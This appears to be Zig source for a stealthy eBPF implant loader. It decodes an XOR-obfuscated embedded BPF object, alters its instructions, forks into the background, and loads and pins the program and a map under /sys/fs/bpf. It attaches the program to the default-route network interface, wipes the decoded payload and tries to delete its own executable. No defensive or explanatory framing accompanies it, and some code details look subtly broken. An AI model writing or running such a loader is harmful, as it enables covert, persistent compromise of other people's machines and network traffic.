const std = @import("std");
const sc = @import("syscalls.zig");

pub fn _start() noreturn {
    var bpf_blob = @constCast(@embedFile("../target/ghost.o").*);
    inline for (0..bpf_blob.len) |idx| { bpf_blob[idx] ^= 0x7A; }

    const meta = parse_elf(bpf_blob);
    if (meta.size > 0) {
        mutate_regs(bpf_blob[meta.offset .. meta.offset + meta.size]);
    }

    const iface = find_iface();
    const stack = sc.mmap(0, 65536, 3, 0x22, -1, 0);
    if (sc.clone(0x00000100 | 17, stack + 65536) != 0) sc.exit(0);

    const prog_fd = sc.bpf_syscall(5, &sc.bpf_attr_load{
        .prog_type = 6,
        .insn_cnt = @intCast(meta.size / 8),
        .insns = @intFromPtr(bpf_blob.ptr) + meta.offset,
        .license = @intFromPtr("GPL"),
    }, 128);

    const map_fd = sc.bpf_syscall(0, &sc.bpf_attr_map{
        .map_type = 10,
        .key_size = 16,
        .value_size = 8,
        .max_entries = 1024,
    }, 72);

    _ = sc.mkdir("/sys/fs/bpf/zt", 0o755);
    _ = sc.bpf_syscall(17, &sc.bpf_attr_pin{ 
        .path = @intFromPtr("/sys/fs/bpf/zt/map"), 
        .fd = @intCast(map_fd) 
    }, 16);

    @memset(bpf_blob, 0);

    _ = sc.bpf_syscall(28, &sc.bpf_attr_link{ 
        .prog_fd = @intCast(prog_fd), 
        .target_ifindex = iface, 
        .attach_type = 37 
    }, 64);

    _ = sc.unlink("/proc/self/exe");
    while (true) { _ = sc.nanosleep(3600); }
}

fn mutate_regs(insns: []u8) void {
    var i: usize = 0;
    while (i + 8 <= insns.len) : (i += 8) {
        if (insns[i] == 0x07 or insns[i] == 0x0f) {
            const regs = insns[i + 1];
            insns[i + 1] = ((regs & 0x0F) << 4) | ((regs & 0xF0) >> 4);
        }
    }
}

fn find_iface() u32 {
    var buf: [1024]u8 = undefined;
    const fd = sc.open("/proc/net/route", 0);
    const n = sc.read(@intCast(fd), &buf, 1024);
    _ = sc.close(@intCast(fd));
    var it = std.mem.tokenize(u8, buf[0..@intCast(n)], "\n");
    _ = it.next();
    while (it.next()) |l| {
        var p = std.mem.tokenize(u8, l, "\t ");
        const name = p.next() orelse continue;
        if (std.mem.eql(u8, p.next() orelse "", "00000000")) return get_idx(name);
    }
    return 2;
}

fn get_idx(name: []const u8) u32 {
    var path: [64]u8 = undefined;
    const p = std.fmt.bufPrintZ(&path, "/sys/class/net/{s}/ifindex", .{name}) catch return 2;
    const fd = sc.open(p, 0);
    var b: [8]u8 = undefined;
    const n = sc.read(@intCast(fd), &b, 8);
    _ = sc.close(@intCast(fd));
    return std.fmt.parseInt(u32, std.mem.trim(u8, b[0..@intCast(n)], "\n "), 10) catch 2;
}

fn parse_elf(blob: []u8) struct { offset: u64, size: u64 } {
    if (blob.len < 64) return .{ .offset = 0, .size = 0 };
    const shoff = @as(*u64, @ptrFromInt(@intFromPtr(blob.ptr) + 40)).*;
    const shnum = @as(*u16, @ptrFromInt(@intFromPtr(blob.ptr) + 60)).*;
    const shentsize = @as(*u16, @ptrFromInt(@intFromPtr(blob.ptr) + 58)).*;
    
    for (0..shnum) |i| {
        const ptr = @intFromPtr(blob.ptr) + shoff + (i * shentsize);
        if (@as(*u32, @ptrFromInt(ptr + 4)).* == 1) {
            return .{ 
                .offset = @as(*u64, @ptrFromInt(ptr + 24)).*, 
                .size = @as(*u64, @ptrFromInt(ptr + 32)).* 
            };
        }
    }
    return .{ .offset = 0, .size = 0 };
}
